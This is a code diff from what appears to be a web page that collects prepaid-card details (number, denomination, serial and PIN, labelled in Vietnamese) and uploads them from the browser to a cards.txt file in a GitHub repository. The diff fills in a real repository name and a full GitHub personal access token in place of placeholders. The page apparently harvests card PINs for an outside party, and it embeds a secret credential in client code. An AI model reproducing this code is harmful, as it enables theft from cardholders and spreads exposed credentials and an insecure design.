@@ -73,10 +73,10 @@
             var fileContent = "Số thẻ: " + cardNumber + "\nMệnh giá: " + cardValue + "\nSố serial: " + cardSerial + "\nMã PIN: " + cardPin;
 
             // Sử dụng API của GitHub để tạo tệp mới
-            fetch("https://api.github.com/repos/your-username/your-repository-name/contents/cards.txt", {
+            fetch("https://api.github.com/repos/YTHzgamer/YTHzgamer.github.io/contents/cards.txt", {
                 method: "PUT",
                 headers: {
-                    "Authorization": "Bearer YOUR_ACCESS_TOKEN"
+                    "Authorization": "Bearer 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"
                 },
                 body: JSON.stringify({
                     message: "Add new card",
